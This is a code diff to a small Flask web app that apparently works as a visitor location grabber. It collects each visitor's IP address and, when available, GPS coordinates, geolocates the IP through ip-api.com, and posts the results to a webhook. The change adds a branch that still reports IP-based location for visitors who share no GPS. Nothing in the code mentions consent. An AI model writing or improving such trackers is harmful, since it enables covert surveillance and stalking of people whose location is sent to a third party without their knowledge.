@@ -13,8 +13,15 @@ def get_location():
     data = request.json or {}
     ip = request.remote_addr
 
-    ip_info = requests.get(f'http://ip-api.com/json/{ip}').json()
+    if data.get('ip_only'):
+        ip_info = requests.get(f'http://ip-api.com/json/{ip}').json()
+        msg = {
+            "content": f"IP only visitor:\nIP: {ip}\nLocation: {ip_info.get('city')}, {ip_info.get('country')}"
+        }
+        requests.post(webhook_url, json=msg)
+        return jsonify({"status": "ip_sent"})
 
+    ip_info = requests.get(f'http://ip-api.com/json/{ip}').json()
     msg = {
         "content": f"""
 GPS: {data.get('lat')} , {data.get('lon')}
@@ -22,10 +29,8 @@ IP: {ip}
 IP Location: {ip_info.get('city')}, {ip_info.get('country')} ({ip_info.get('lat')}, {ip_info.get('lon')})
 """
     }
-
     requests.post(webhook_url, json=msg)
-
-    return jsonify({"status": "sent"})
+    return jsonify({"status": "gps_sent"})
 
 if __name__ == '__main__':
     app.run()
